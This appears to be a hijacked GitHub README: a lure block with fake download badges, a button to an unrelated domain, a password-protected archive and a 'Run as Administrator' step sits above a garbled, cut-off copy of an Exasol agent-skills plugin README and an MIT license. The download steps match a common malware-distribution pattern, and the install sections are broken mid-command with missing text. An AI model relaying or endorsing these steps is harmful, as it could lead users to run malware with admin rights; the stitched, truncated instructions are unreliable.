<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Install and update

### Interactive install

```bash
curl -fsSL --proto '=https' --tlsv1.2 \
### Non-interactive install

```bash
curl -fsSL --proto '=https' --tlsv1.2 \
# Claude Code
claude plugin marketplace add exasol-labs/exasol-agent-skills
claude plugin install exasol@exasol-skills

# OpenAI Codex
npx --yes skills@1.5.22 add exasol-labs/exasol-agent-skills \
  --agent codex --global
```

Manual update:

```bash
# Claude Code
claude plugin marketplace update exasol-skills
claude plugin update exasol@exasol-skills --scope user

# OpenAI Codex
npx --yes skills@1.5.22 add exasol-labs/exasol-agent-skills \
  --agent codex --global
```

## Features

- SQL, schema, table-design, reserved-keyword, and exapump guidance.
- Native `IMPORT` and `EXPORT`, local file movement, and Cloud Storage Extension workflows.
- JDBC and document-file virtual schemas, plus custom adapter development.
- Extension and integration selection for deployment, loading, enrichment, BI/API, governance, and scale.
- UDFs, Script Language Containers, BucketFS, distributed ML, and GPU workflows.
- Direct PyExasol development, plus notebook-connector configuration, ITDE lifecycle, Python connection helpers, Text AI, and Transformers.
- Exasol Personal setup for local macOS and AWS, Azure, Exoscale, or STACKIT deployments.

The complete skill catalog is available under
## Usage examples

```text
/exasol SELECT * FROM my_table LIMIT 10
/exasol upload sales.csv to analytics.sales
/exasol export users to parquet
/exasol create a PostgreSQL JDBC virtual schema
/exasol build a custom virtual schema adapter for a new JDBC dialect
/exasol list BucketFS files under models/
/exasol initialize the Text AI Extension for notebook-connector
/exasol write a Python UDF
/exasol set up Exasol Personal on AWS
```

## Requirements

| Requirement | Used by |
| --- | --- |
## Contributing

Start from the skeleton in


---

MIT License

Copyright (c) 2026 Exasol AG

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
